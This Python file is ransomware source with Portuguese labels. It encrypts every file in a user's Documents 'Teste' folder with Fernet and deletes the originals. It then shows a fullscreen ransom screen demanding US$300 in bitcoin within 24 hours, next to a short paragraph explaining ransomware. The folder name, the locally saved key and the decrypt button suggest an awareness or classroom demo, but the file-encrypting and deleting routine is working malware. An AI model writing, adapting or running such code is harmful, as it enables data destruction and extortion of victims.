from cryptography.fernet import Fernet
import os
import platform
import tkinter as tk
from PIL import Image, ImageTk
import sys

def user_name():
    if os.name == 'posix':
        return os.getenv('USER') 
    elif os.name == 'nt':
        return os.getenv('USERNAME')

def generate_key():
    return Fernet.generate_key()

def load_key(key_path):
    with open(key_path, 'rb') as key_file:
        return key_file.read()

def save_key(key, key_path):
    with open(key_path, 'wb') as key_file:
        return key_file.write(key)

def encrypt_file(file_path, key, output_path):
    with open(file_path, 'rb') as file:
        data = file.read()

    ciper_suit = Fernet(key)
    encrypted_data = ciper_suit.encrypt(data) 

    with open(output_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

def decrypt_file(encrypted_path, key, output_path):
    with open(encrypted_path, 'rb') as encrypted_file:
        encrypted_data = encrypted_file.read()

    cipher_suite = Fernet(key)
    decrypted_data = cipher_suite.decrypt(encrypted_data)

    with open(output_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)

def criptografar(diretorio_path, key):
    for root, dirs, files in os.walk(diretorio_path):
        for filename in files:
            file_path = os.path.join(root, filename)
            output_path = os.path.join(root, f'encrypted_{filename}')
            encrypt_file(file_path, key, output_path)
            os.remove(file_path)

    print('Processo de criptografia realizado com sucesso')

def identificar_so():
    sistema = platform.system()
    release = platform.release()

    if 'Windows' in sistema:
        print(f'Sistema Operacional: {sistema}')
        print(f'Release: {release}')
        nome = user_name()
        diretorio = f'C:\\Users\\{nome}\\Documentos\\Teste'

        
    elif 'Linux' in sistema:
        distro = platform.freedesktop_os_release()
        print(distro['NAME'], distro['VERSION'])
        nome = user_name()
        diretorio = f'/home/{nome}/Documents/teste'
    
        
    else:
        print(f'Sistema Operacional não reconhecido: {sistema}')

    key_path = 'key.key'
    if os.path.exists(key_path):
        key = load_key(key_path)
    else:
        key = generate_key()
        save_key(key, key_path)

    criptografar(diretorio, key)
    
    return sistema

so = identificar_so()

def on_decrypt_button_click():
    key_path = 'key.key'
    if os.path.exists(key_path):
        key = load_key(key_path)
        sistema = platform.system()
        nome = user_name()
        if sistema == 'Windows':
            diretorio_path = f'C:\\Users\\{nome}\\Documentos\\Teste'
        elif sistema == 'Linux':
            diretorio_path = f'/home/{nome}/Documents/teste'
        else:
            print(f'Sistema Operacional não reconhecido: {sistema}')
            return

        for filename in os.listdir(diretorio_path):
            if filename.startswith('encrypted_'):
                encrypted_file_path = os.path.join(diretorio_path, filename)
                decrypted_file_path = os.path.join(diretorio_path, filename[len('encrypted_'):])
                decrypt_file(encrypted_file_path, key, decrypted_file_path)
                print(f'Arquivo {filename} descriptografado.')

        print('Processo de descriptografia realizado com sucesso')


def resource_path(relative_path):
    """ Retorna o caminho para o recurso, funciona para desenvolvimento e para executável único """
    try:
        # PyInstaller cria uma pasta temporária e armazena o caminho em _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


def exibir_conscientizacao():
    janela = tk.Tk()
    janela.title("Descriptografia")
    janela.geometry("1920x1080")
    janela.overrideredirect(True)

    imagem_fundo = Image.open(resource_path("imagens/fundo.jpeg"))
    imagem_fundo = ImageTk.PhotoImage(imagem_fundo)

    label_fundo = tk.Label(janela, image=imagem_fundo)
    label_fundo.place(relwidth=1,relheight=1)

    cadeado = Image.open(resource_path("imagens/cadeado.png"))
    cadeado = cadeado.resize((253,274))
    imagem_cadeado = ImageTk.PhotoImage(cadeado)

    label_cadeado = tk.Label(janela,image=imagem_cadeado)
    label_cadeado.place(relx=0.13,rely=0.2,anchor="center")

    titulo_explicacao = tk.Label(janela, bg="black",fg="red", text="Seus arquivos foram criptografados")
    titulo_explicacao.pack(anchor=tk.CENTER)

    explicacao = tk.Label(janela, bg="black",fg="red", text="para recuperar seus arquivos, você precisa  pagar um resgate de US$ 300 em bitcoin para o seguinte endereço:")
    explicacao.pack(anchor=tk.CENTER,pady=20)

    carteira = tk.Label(janela, bg="black",fg="red", text="Carteira: 39279fshdfskbAWEas342ssfe24afgDWkl2313jnsp$Mw")
    carteira.pack(anchor=tk.CENTER,pady=20)

    tempo_pagamento = tk.Label(janela, bg="black",fg="red", text="Você tem 24 horas para pagar o resgate. Caso contrário, seus arquivos serão perididos para sempre")
    tempo_pagamento.pack(anchor=tk.CENTER,pady=20)

    caixa_explicativa = tk.Text(janela, wrap="word", width=40, height=20, bg="black", fg="red", bd=0)
    caixa_explicativa.insert(tk.END, """O ransomware é uma ameaça digital cada vez mais presente em nosso mundo conectado. Trata-se de um tipo de malware que, quando executado em um computador, criptografa os arquivos do usuário, tornando-os inacessíveis. Os cibercriminosos por trás desse ataque, então, exigem um resgate em troca da chave de descriptografia, ameaçando a perda permanente de dados valiosos. Para garantir a segurança de suas informações, é fundamental que todos estejam cientes dos riscos associados ao ransomware e saibam como se proteger.""")
    caixa_explicativa.place(relx=0.05, rely=0.5, anchor="w")

    botao_copia = tk.Button(janela, bg="black",fg="red", text="Copiar Carteira", command=lambda:'39279fshdfskbAWEas342ssfe24afgDWkl2313jnsp$Mw')
    botao_copia.pack(anchor=tk.CENTER)

    botao_cancelar = tk.Button(janela, bg="black",fg="red", text="Cancelar", command=lambda: janela.destroy())
    botao_cancelar.pack(anchor=tk.CENTER)

    botao_descriptografar = tk.Button(janela, bg="black",fg="red", text="Descriptografar", command=lambda: on_decrypt_button_click())
    botao_descriptografar.pack(anchor=tk.CENTER)

    janela.mainloop()

if __name__ == "__main__":
    exibir_conscientizacao()